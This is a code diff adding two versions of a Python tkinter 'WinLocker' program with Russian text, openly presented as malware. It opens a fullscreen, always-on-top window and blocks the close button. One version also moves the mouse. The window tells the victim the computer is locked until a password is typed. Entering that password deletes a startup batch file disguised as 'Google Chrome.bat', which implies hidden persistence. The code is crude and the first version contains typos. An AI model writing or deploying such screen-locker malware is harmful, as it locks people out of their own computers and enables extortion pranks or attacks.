@@ -1,0 +1,169 @@
+import tkinter
+from tkinter import *
+import tkinter.ttk as tk
+from tkinter import ttk
+import getpass
+import sys
+import os
+import os.path
+from time import sleep
+
+# Создание окна. Присваиваем переменной имя нашего пользователя ( user )
+USER_NAME = getpass.getuser()
+
+window = Tk()  #Приравниваем переменной имя нашего пользователя ( user )
+window.title("Winlocker by Nickyfwd ") #Заголовок окна
+window.geometry("400x250") # Размер окна ( он вряд ли пригодится но на всякий)
+window['bg'] = 'black' # цвет фона
+
+normal_widht = 1920
+normal_height = 1080
+
+
+#Baze size
+screen_width = window.winfo_screenwidth()
+screen_height = window.winfo_screenheight()
+
+
+# Get percentage of screen size from Base size
+percentage_width = screen_width / (normal_widht / 100)
+percentage_height = screen_height / (normal_height / 100)
+
+scale_factor = ((percentage_height + percentage_width) / 2) / 100
+
+fontsize = int(20 * scale_factor)
+minimum_size = 10
+if fontsize < minimum_size:
+    fontsize = minimum_size
+
+fontsizeHding = int(72 * fontsize)
+minimum_size = 40
+if fontsizeHding < minimum_size:
+    fontsizeHding = minimum_size
+
+# Create a style and configure for ttk.Button widget
+default_style = ttk.Style()
+default_style.configure('New.TButton', font=('Helvertica', fontsize))
+
+def block():
+    window.protocol("WM_DELETE_WINDOW", block)
+    window.update()
+
+def fullscreen():
+    window.attributes('-fullscreen', True, '-tompost', True)
+
+def clicked():
+    res = format(txt.get())
+    if res == '148851':
+        file_path = '/tmp/file.txt'
+        os.remove(file_path)
+        sys.exit(0)
+
+
+
+
+
+txt_one = Label(window, text='Winlocker by Nickyfwd :D', font=('Arial Bold', fontsizeHding), fg='red', bg='black')
+txt_two = Label(window, text='Сори бро :(', font=('Arial Bold', fontsizeHding), fg='red', bg='black')
+txt_three = Label(window, text='Ваш компьютер был заблокирован винлокером.Введите пароль для получения доступа )))')
+
+txt_one.grid(row=0, column=0)
+txt_two.grid(row=0, column=0)
+txt_three.grid(row=0, column=0)
+
+txt_one.place(relx = .01, rely = .01)
+txt_two.place(relx = .01, rely = .11)
+txt_three.place(relx = .01, rely = .21)
+
+
+txt = Entry(window)
+btn = Button(window, text='ВВОД КОДА', command=clicked)
+txt.place(relx = .10, rely = .5, relwidth = .3, relheight = .06)
+btn.place(relx = .62, rely = .5, relwidth = .1, relheight = .06)
+
+
+
+window.mainloop()
+import tkinter
+from tkinter import *
+import tkinter as tk
+from tkinter import ttk
+import getpass
+import sys
+import os
+import os.path
+import pyautogui
+from time import sleep
+
+USER_NAME = getpass.getuser()
+
+window = Tk()
+window.title("WinLocker by Coddy_School")
+window.geometry('400x250')
+window['bg'] = 'black'
+
+# Base size
+normal_width = 1920
+normal_height = 1080
+
+
+screen_width = window.winfo_screenwidth()
+screen_height = window.winfo_screenheight()
+
+percentage_width = screen_width / (normal_width / 100)
+percentage_height = screen_height / (normal_height / 100)
+
+scale_factor = ((percentage_width + percentage_height) / 2) / 100
+
+fontsize = int(20 * scale_factor)
+minimum_size = 10
+if fontsize < minimum_size:
+       fontsize = minimum_size
+
+fontsizeHding = int(72 * scale_factor)
+minimum_size = 40
+if fontsizeHding < minimum_size:
+       fontsizeHding = minimum_size
+
+default_style = ttk.Style()
+default_style.configure('New.TButton', font=("Helvetica", fontsize))
+
+
+def block():
+    pyautogui.moveTo(x=680,y=800)
+    window.protocol("WM_DELETE_WINDOW",block)
+    window.update()
+
+def fullscreen():
+    window.attributes('-fullscreen', True, '-topmost', True)
+
+def clicked():
+    res = format(txt.get())
+    if res == 'говно':
+        file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USER_NAME
+        os.remove(file_path)
+        sys.exit()
+
+fullscreen()
+
+txt_one = Label(window, text='WinLocker by Nickyfwd', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
+txt_two = Label(window, text=':)))))))', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
+txt_three = Label(window, text='Ваш компьютер был заблокирован винлокером. Пожалуйста, введите пароль для получения доступа к компьютеру!', font=("Arial Bold", fontsize), fg='white', bg='black')
+
+txt_one.grid(column=0, row=0)
+txt_two.grid(column=0, row=0)
+txt_three.grid(column=0, row=0)
+
+txt_one.place(relx = .01, rely = .01)
+txt_two.place(relx = .01, rely = .11)
+txt_three.place(relx = .01, rely = .21)
+
+
+txt = Entry(window)
+btn = Button(window, text="ВВОД КОДА", command=clicked)
+txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
+btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)
+
+block()
+
+window.mainloop()
